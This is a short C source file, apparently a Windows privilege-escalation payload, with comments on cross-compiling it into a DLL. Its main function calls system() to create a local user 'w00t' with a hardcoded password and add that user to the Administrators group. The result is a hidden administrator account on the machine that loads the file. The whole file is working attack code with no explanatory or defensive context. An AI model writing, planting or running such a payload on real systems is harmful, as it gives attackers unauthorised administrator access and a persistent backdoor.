// For x64 compile with: x86_64-w64-mingw32-gcc useradd.c -o useradd.dll
// For x86 compile with: i686-w64-mingw32-gcc useradd.c -o useradd.dll

#include <stdio.h>
#include <string.h>

int main () 
{

	system("net user w00t BlaBlouf7273! /add");
	system("net localgroup Administrators w00t /add");

	return 0;
}
